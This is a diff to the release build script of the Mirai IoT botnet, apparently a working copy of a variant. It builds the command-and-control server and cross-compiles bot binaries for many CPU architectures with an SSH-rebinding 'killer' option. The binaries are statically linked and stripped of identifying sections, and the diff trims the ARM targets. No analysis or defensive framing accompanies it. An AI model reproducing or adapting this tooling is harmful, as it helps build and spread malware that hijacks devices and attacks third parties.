@@ -24,14 +24,11 @@ elif [ "$1" == "release" ]; then
     rm release/mirai.*
     rm release/miraint.*
     go build -o release/cnc cnc/*.go
-    gcc -std=c99 $FLAGS -DKILLER_REBIND_SSH -static bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/mirai.exp -DMIRAI_BOT_ARCH="i586"
-    strip release/mirai.exp -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
-    compile_bot i586 mirai.x86 "$FLAGS -DKILLER_REBIND_SSH -static"
+    gcc -std=c99 $FLAGS -DKILLER_REBIND_SSH -static bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/mirai.x86 -DMIRAI_BOT_ARCH="i586"
+    strip release/mirai.x86 -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
     compile_bot mips mirai.mips "$FLAGS -DKILLER_REBIND_SSH -static"
     compile_bot mipsel mirai.mpsl "$FLAGS -DKILLER_REBIND_SSH -static"
     compile_bot armv4l mirai.arm "$FLAGS -DKILLER_REBIND_SSH -static"
-    compile_bot armv5l mirai.arm5n "$FLAGS -DKILLER_REBIND_SSH"
-    compile_bot armv6l mirai.arm7 "$FLAGS -DKILLER_REBIND_SSH -static"
     compile_bot powerpc mirai.ppc "$FLAGS -DKILLER_REBIND_SSH -static"
     compile_bot sparc mirai.spc "$FLAGS -DKILLER_REBIND_SSH -static"
     compile_bot m68k mirai.m68k "$FLAGS -DKILLER_REBIND_SSH -static"
@@ -41,8 +38,6 @@ elif [ "$1" == "release" ]; then
     compile_bot mips miraint.mips "-static"
     compile_bot mipsel miraint.mpsl "-static"
     compile_bot armv4l miraint.arm "-static"
-    compile_bot armv5l miraint.arm5n " "
-    compile_bot armv6l miraint.arm7 "-static"
     compile_bot powerpc miraint.ppc "-static"
     compile_bot sparc miraint.spc "-static"
     compile_bot m68k miraint.m68k "-static"
